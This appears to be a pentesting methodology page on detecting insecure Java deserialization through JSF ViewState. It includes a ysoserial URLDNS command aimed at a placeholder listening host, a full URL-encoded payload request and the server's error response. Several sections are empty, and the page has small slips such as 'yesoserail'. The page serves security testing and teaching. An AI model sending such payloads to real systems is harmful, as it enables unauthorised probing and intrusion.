# Insecure Deserialization

## Check List

## Methodology

### Black Box

#### Java Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Then view the requests sent and check if any data is sent as follows

```
"javax.faces.ViewState" value="rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAN0AAE0cHQAEy9wcm90ZWN0ZWQvaG9tZS5qc3A="
```
{% endstep %}

{% step %}
For the uninitiated, the prefix `rO0ABXV` indicates an unencrypted Java Object
{% endstep %}

{% step %}
Then, by creating a dangerous object using the yesoserail tool for the js language, I sent the request by sending a request similar to the one below, and if the code is executed, I say that a vulnerability has occurred

```bash
./java -jar ysoserial.jar URLDNS "<http://listening-host>" | base64
```

now send request

```http
GET /res/login.jsf?javax.faces.ViewState=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48%32%73%48%44%46%6d%44%52%41%77%41%43%52%67%41%4b%62%47%39%68%5a%45%5a%68%59%33%52%76%63%6b%6b%41%43%58%52%6f%63%6d%56%7a%61%47%39%73%5a%48%68%77%50%30%41%41%41%41%41%41%41%41%78%33%43%41%41%41%41%42%41%41%41%41%41%42%63%33%49%41%44%47%70%68%64%6d%45%75%62%6d%56%30%4c%6c%56%53%54%4a%59%6c%4e%7a%59%61%2f%4f%52%79%41%77%41%48%53%51%41%49%61%47%46%7a%61%45%4e%76%5a%47%56%4a%41%41%52%77%62%33%4a%30%54%41%41%4a%59%58%56%30%61%47%39%79%61%58%52%35%64%41%41%53%54%47%70%68%64%6d%45%76%62%47%46%75%5a%79%39%54%64%48%4a%70%62%6d%63%37%54%41%41%45%5a%6d%6c%73%5a%58%45%41%66%67%41%44%54%41%41%45%61%47%39%7a%64%48%45%41%66%67%41%44%54%41%41%49%63%48%4a%76%64%47%39%6a%62%32%78%78%41%48%34%41%41%30%77%41%41%33%4a%6c%5a%6e%45%41%66%67%41%44%65%48%44%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%33%51%41%4c%47%6b%7a%62%58%59%32%5a%44%42%76%4d%57%70%78%4d%7a%56%70%64%54%67%79%5a%6a%63%79%5a%57%35%7a%5a%54%4d%31%4f%58%64%34%62%6d%78%6a%4c%6d%39%68%63%33%52%70%5a%6e%6b%75%59%32%39%74%64%41%41%41%63%51%42%2b%41%41%56%30%41%41%52%6f%64%48%52%77%63%48%68%30%41%44%4e%6f%64%48%52%77%4f%69%38%76%61%54%4e%74%64%6a%5a%6b%4d%47%38%78%61%6e%45%7a%4e%57%6c%31%4f%44%4a%6d%4e%7a%4a%6c%62%6e%4e%6c%4d%7a%55%35%64%33%68%75%62%47%4d%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%31%34 HTTP/1.1
Host: localhost:9060
```

the Response

```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Servlet/3.1
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Type: text/html;charset=ISO-8859-1
$WSEP: 
Content-Language: en-US
Connection: Close
Date: Mon, 19 Feb 2024 03:16:40 GMT
Content-Length: 103

Error 500: javax.servlet.ServletException: java.util.HashMap incompatible with [Ljava.lang.Object&#59;
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
